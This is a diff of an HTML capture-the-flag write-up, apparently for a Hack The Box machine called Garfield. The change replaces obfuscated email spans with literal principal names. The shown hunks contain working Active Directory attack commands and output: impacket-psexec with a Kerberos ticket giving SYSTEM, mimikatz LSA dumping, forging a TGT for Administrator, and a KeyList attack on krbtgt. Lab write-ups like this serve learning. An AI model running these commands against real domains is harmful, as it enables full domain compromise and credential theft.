@@ -351,12 +351,12 @@ ligolo-ng$ start
   -impersonate Administrator \
   -dc-ip 10.129.xx.xx
 
-<span class="c-green">$</span> export KRB5CCNAME=$(pwd)/Administrator@<a href="/cdn-cgi/l/email-protection" class="__cf_email__" data-cfemail="74171d12072b263b303744455a131506121d1118105a1c001634333526323d3138305a3c20365a171715171c11">[email&#160;protected]</a>
+<span class="c-green">$</span> export KRB5CCNAME=$(pwd)/Administrator&#64;cifs_RODC01.garfield.htb&#64;GARFIELD.HTB.ccache
 
 <span class="c-green">$</span> impacket-psexec -k -no-pass \
   -dc-ip 10.129.xx.xx \
   -target-ip 192.168.100.2 \
-  garfield.htb/<a href="/cdn-cgi/l/email-protection" class="__cf_email__" data-cfemail="acedc8c1c5c2c5dfd8decdd8c3deecfee3e8ef9c9d82cbcddecac5c9c0c882c4d8ce">[email&#160;protected]</a></code></pre>
+  garfield.htb/Administrator&#64;RODC01.garfield.htb</code></pre>
 
       <pre data-label="output"><code>C:\Windows\system32&gt; whoami
 <span class="c-green">nt authority\system</span></code></pre>
@@ -449,8 +449,8 @@ C:\Windows\Temp&gt; mimikatz.exe "privilege::debug" "lsadump::lsa /inject /name:
   /sid:S-1-5-21-2502726253-3859040611-225969357</code></pre>
 
       <pre data-label="output"><code>[*] Action: Build TGT
-[*] Forged a TGT for '<a href="/cdn-cgi/l/email-protection" class="__cf_email__" data-cfemail="b1f0d5dcd8dfd8c2c5c3d0c5dec3f1d6d0c3d7d8d4ddd59fd9c5d3">[email&#160;protected]</a>'
-<span class="c-green">[*] Ticket written to <a href="/cdn-cgi/l/email-protection" class="__cf_email__" data-cfemail="afdbc6ccc4cadbf0818181f0eecbc2c6c1c6dcdbddcedbc0ddf0dbc0f0c4ddcddbc8dbefe8eefde9e6eae3eb81e7fbed81c4c6ddcdc6">[email&#160;protected]</a></span></code></pre>
+[*] Forged a TGT for 'Administrator&#64;garfield.htb'
+<span class="c-green">[*] Ticket written to ticket_..._Administrator_to_krbtgt&#64;GARFIELD.HTB.kirbi</span></code></pre>
 
       <h3>Step 2 — KeyList Attack</h3>
 
@@ -458,13 +458,13 @@ C:\Windows\Temp&gt; mimikatz.exe "privilege::debug" "lsadump::lsa /inject /name:
   /enctype:aes256 /keyList `
   /service:krbtgt/garfield.htb `
   /dc:DC01.garfield.htb `
-  /ticket:<a href="/cdn-cgi/l/email-protection" class="__cf_email__" data-cfemail="84f0ede7efe1f0dbaaaaaadbc5e0e9edeaedf7f0f6e5f0ebf6dbf0ebdbeff6e6f0e3f0c4c3c5d6c2cdc1c8c0aaccd0c6aaefedf6e6ed">[email&#160;protected]</a> `
+  /ticket:ticket_..._Administrator_to_krbtgt&#64;GARFIELD.HTB.kirbi `
   /nowrap</code></pre>
 
       <pre data-label="output"><code>[*] Action: Ask TGS
 [*] Building KeyList TGS-REQ for: 'Administrator'
 [*] Using domain controller: DC01.garfield.htb
-<span class="c-green">[*] Got a TGT for '<a href="/cdn-cgi/l/email-protection" class="__cf_email__" data-cfemail="0e4f6a636760677d7a7c6f7a617c4e494f5c48474b424a20465a4c">[email&#160;protected]</a>'</span>
+<span class="c-green">[*] Got a TGT for 'Administrator&#64;GARFIELD.HTB'</span>
 [*] base64(ticket.kirbi):
     &lt;BASE64_BLOB&gt;</code></pre>
 
